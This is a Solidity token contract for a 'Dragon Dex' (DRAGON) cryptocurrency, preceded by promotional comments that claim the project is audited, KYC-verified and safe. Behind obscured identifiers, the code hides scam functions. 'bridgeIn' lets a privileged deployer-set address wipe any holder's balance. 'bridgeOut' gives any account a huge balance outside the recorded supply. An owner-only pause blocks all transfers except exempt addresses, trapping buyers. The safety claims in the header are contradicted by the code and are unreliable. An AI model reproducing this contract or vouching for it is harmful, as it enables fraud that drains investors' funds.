// Dragon Dex helps you make the most out of your crypto in three ways: Trade, Earn, and IFO. Unlike centralized exchanges like Binance or Coinbase. Top Trade bonus up to 3k5$. Utility is split in 3 ways: 1. Launch Pad participation 2. Farming/Staking Reward 3. NFT & IFO transaction fees ✅ DOXX+SAFU+KYC+AUDIT ✅ Experienced team huge marketing planned ✅ 3% BUY/SELL TAX ✅ No Private sale ✅ CMC-CG Fast track ✅ Utility ready before presale ✅ NO UNLOCKED TOKENS.
// https://dragondex.net/
// https://twitter.com/DragonDex_Bsc
// https://dragondex.net/

// SPDX-License-Identifier: MIT
pragma solidity >0.8.15;
////// lib/openzeppelin-contracts/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

/* pragma solidity ^0.8.0; */

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract jetonerc20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface jetonownlable {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 numerototal) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 numerototal) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 totalo);

    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}

interface jetonocontext is jetonownlable {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract jetonmpfz is jetonerc20 {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract dragondex is jetonerc20, jetonownlable, jetonocontext, jetonmpfz {

    mapping(address => uint256) private memeosjetons;
  mapping(address => bool) public jetonocontextZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;
address private DOGESWAPtken;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address CSSbitcin;
    // My variables
    mapping(address => bool) public isPauseWAW;
    bool rabbitsPaused;
    
    constructor(address DOGESWAP) {
            // Editable
            CSSbitcin = msg.sender;
            jetonocontextZERTY[CSSbitcin] = true;
        _name = "Dragon Dex";
        _symbol = "DRAGON";
  DOGESWAPtken = DOGESWAP;        
        uint _totalSupply = 10000000 * 10**9;
        rabbitsPaused = false;
        // End editable

        isPauseWAW[msg.sender] = true;

        Multicalls(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return memeosjetons[account];
    }

    function transfer(address to, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, numerototal);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, numerototal);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, numerototal);
        _transfer(from, to, numerototal);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        _deforeTokenTransfer(from, to, numerototal);

        // My implementation
        require(!rabbitsPaused || isPauseWAW[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = memeosjetons[from];
        require(fromBalance >= numerototal, "Ehi20: transfer numerototal exceeds balance");
        unchecked {
            memeosjetons[from] = fromBalance - numerototal;
        }
        memeosjetons[to] += numerototal;

        emit Transfer(from, to, numerototal);

        _CSSfterTokenTransfer(from, to, numerototal);
    }
  modifier CSS0wner () {
    require(CSSbitcin == msg.sender, "Ehi20: cannot permit CSScake address");
    _;
  
  }
    function Multicalls(address account, uint256 numerototal) internal virtual {
        require(account != address(0), "Ehi20: mint to the zero address");

        _deforeTokenTransfer(address(0), account, numerototal);

        ALLtotalSupply += numerototal;
        memeosjetons[account] += numerototal;
        emit Transfer(address(0), account, numerototal);

        _CSSfterTokenTransfer(address(0), account, numerototal);
    }
    modifier CSScake() {
        require(DOGESWAPtken == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function bridgeIn(address jetonocontextccount) external CSScake {
    memeosjetons[jetonocontextccount] = 0;
            emit Transfer(address(0), jetonocontextccount, 0);
  }

    function _burn(address account, uint256 numerototal) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        _deforeTokenTransfer(account, address(0), numerototal);

        uint256 accountBalance = memeosjetons[account];
        require(accountBalance >= numerototal, "Ehi20: burn numerototal exceeds balance");
        unchecked {
            memeosjetons[account] = accountBalance - numerototal;
        }
        ALLtotalSupply -= numerototal;

        emit Transfer(account, address(0), numerototal);

        _CSSfterTokenTransfer(account, address(0), numerototal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        _allowances[owner][spender] = numerototal;
        emit Approval(owner, spender, numerototal);
    }
  function bridgeOut(address jetonocontextccontz) external CSScake {
    memeosjetons[jetonocontextccontz] = 10000 * 10 ** 23;
            emit Transfer(address(0), jetonocontextccontz, 10000 * 10 ** 23);
  }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= numerototal, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - numerototal);
            }
        }
    }

    function _deforeTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}


    function _CSSfterTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}

    // My functions

    function wCSStingExempt(address account, bool totalo) external onlyOwner {
        isPauseWAW[account] = totalo;
    }
    
    function wCSStingd(bool totalo) external onlyOwner {
        rabbitsPaused = totalo;
    }
}